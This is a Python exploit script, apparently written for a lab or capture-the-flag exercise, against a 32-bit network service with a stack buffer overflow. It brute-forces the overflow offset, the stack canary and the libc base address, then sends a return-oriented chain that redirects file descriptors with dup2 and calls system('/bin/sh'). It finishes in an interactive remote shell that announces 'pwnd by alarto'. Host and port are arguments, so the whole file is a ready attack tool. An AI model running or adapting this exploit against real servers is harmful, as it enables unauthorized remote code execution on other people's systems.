import struct
import time
import socket
import sys
import argparse
from pwn import *

# ================== PARÁMETROS VARIABLES ==================

DEFAULT_PORT = 9999
DEFAULT_HOST = "localhost"
DEFAULT_LIBC_BASE_START = 0xf7c00000
DEFAULT_LIBC_BASE_END = 0xf7e00000
DEFAULT_PAGE_SIZE = 0x1000
DEFAULT_GADGET1_OFFSET = 0x000238a3 # Se debe ajustar por entorno
DEFAULT_GADGET2_OFFSET = 0x0019ef7b # Se debe ajustar por entorno
DEFAULT_LIBC_PATH = "/lib32/libc.so.6" # Ruta por defecto de libc en sistemas de 32 bits

parser = argparse.ArgumentParser(description="Exploit automatizado para buffer overflow con canary y libc.")
parser.add_argument("--host", default="localhost", help="Host objetivo (default: localhost)")
parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Puerto objetivo (default: 9999)")
parser.add_argument("--libc", default=DEFAULT_LIBC_PATH, help="Ruta a la libc (default: /usr/lib32/libc.so.6)")
parser.add_argument("--libc-base-start", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_START, help="Inicio del rango base de libc (default: 0xf7d00000)")
parser.add_argument("--libc-base-end", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_END, help="Fin del rango base de libc (default: 0xf7e00000)")
parser.add_argument("--page-size", type=lambda x: int(x,0), default=DEFAULT_PAGE_SIZE, help="Tamaño de página (default: 0x1000)")
parser.add_argument("--gadget1-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET1_OFFSET, help="Offset del primer gadget (default: 0x000238a3)")
parser.add_argument("--gadget2-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET2_OFFSET, help="Offset del segundo gadget (default: 0x0019ef7b)")
parser.add_argument("--known-canary", type=lambda x: int(x,0), default=None, help="Valor conocido del canario (opcional)")
args = parser.parse_args()

HOST = args.host
PORT = args.port
LIBC_PATH = args.libc
LIBC_BASE_START = args.libc_base_start
LIBC_BASE_END = args.libc_base_end
PAGE_SIZE = args.page_size
GADGET1_OFFSET = args.gadget1_offset
GADGET2_OFFSET = args.gadget2_offset
known_canary = args.known_canary

# ================== FUNCIONES ==================
def generar_direcciones_libc(base_start=LIBC_BASE_START, base_end=LIBC_BASE_END, page_size=PAGE_SIZE):
    return [addr for addr in range(base_start, base_end, page_size)]

def get_connection():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def interact_shell(s):
    sys.stdout.flush()
    s.settimeout(0.5)
    s.send("echo 'pwnd by alarto ^o^'\n".encode())
    s.send("whoami\n".encode())
    sys.stdout.write(s.recv(4096).decode(errors='ignore'))
    while True:
        try:
            sys.stdout.flush()
            c = input("$-> ")
            s.send((c + '\n').encode())
            time.sleep(0.2)
            sys.stdout.write(s.recv(4096).decode(errors='ignore'))
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("quit")
            s.close()
            break

def send_payload(payload_data: bytes, timeout: float = 2.0):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if timeout > 0:
        sock.settimeout(timeout)
    try:
        sock.connect((HOST, PORT))
        sock.send(payload_data)
        response = sock.recv(2048)
        if response:
            return True
    except socket.timeout:
        print("Socket timeout occurred.")
    except socket.error as sock_error:
        print(f"Socket error: {sock_error}")
    finally:
        sock.close()
    return False

def calcular_offset():
    i = 20
    while True:
        PAYLOAD = b"A" * i
        RESPONSE = send_payload(PAYLOAD)
        if not RESPONSE:
            print(f"[+] GOT IT: offset = {i-1}")
            return i-1
        i += 1

def byte_for_byte(payload, len_payload=8):
    p = payload
    start = len(p)
    stop = len(p) + len_payload
    while len(p) < stop:
        for i in range(0, 256):
            attempt = p + bytes([i])
            res = send_payload(attempt)
            if res:
                p = attempt
                print("[+] Byte found 0x%02x" % i)
                break
            if i == 255:
                print("[-] Exploit failed")
                sys.exit(-1)
    result = p[-len_payload:]
    return result

# ================== EXPLOIT ==================
offset = calcular_offset()

print("[+] Byte for byte canary ...")
canary = struct.pack("<I", known_canary) if known_canary else byte_for_byte(b"A" * offset, 4)
print(f"[+] Canary value is 0x{canary.hex()}")


libc = ELF(LIBC_PATH, checksec=False)
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9 # 0x9 is the offset to the command
binsh_offset = next(libc.search(b"/bin/sh"))
dup2_offset = libc.symbols["dup2"]

print(f"system_offset: {hex(system_offset)}")
print(f"exit_offset: {hex(exit_offset)}")
print(f"command_offset: {hex(ls_command_offset)}")

libc_base_guesses = generar_direcciones_libc()

print(f"Guesses: {len(libc_base_guesses)}")

for base in libc_base_guesses:
    system = struct.pack("<I", (base + system_offset))
    exit_addr = struct.pack("<I", (base + exit_offset))
    ls_cmd = struct.pack("<I", (base + ls_command_offset))
    dup2_cmd = struct.pack("<I", (base + dup2_offset))
    binsh = struct.pack("<I", (base + binsh_offset))
    gadget1 = struct.pack("<I", (base + GADGET1_OFFSET))
    gadget2 = struct.pack("<I", (base + GADGET2_OFFSET))

    PAYLOAD = b"A" * offset # OFFSET TO CANARY
    PAYLOAD += canary
    PAYLOAD += b"B" * 12 # PADDING
    PAYLOAD += system + gadget1 + ls_cmd
    PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(0)
    PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(1)
    PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(2)
    PAYLOAD += system + gadget1 + ls_cmd
    PAYLOAD += system + exit_addr + binsh

    try:
        s = get_connection()
        s.settimeout(0.5)
        s.send(PAYLOAD)
        response = s.recv(4096)
        if response:
            s.settimeout(None)
            print("[+] Shell encontrada:")
            interact_shell(s)
            break
        else:
            s.close()
    except socket.timeout:
        print("Socket timeout occurred.")

print("[+] Finished wihout success")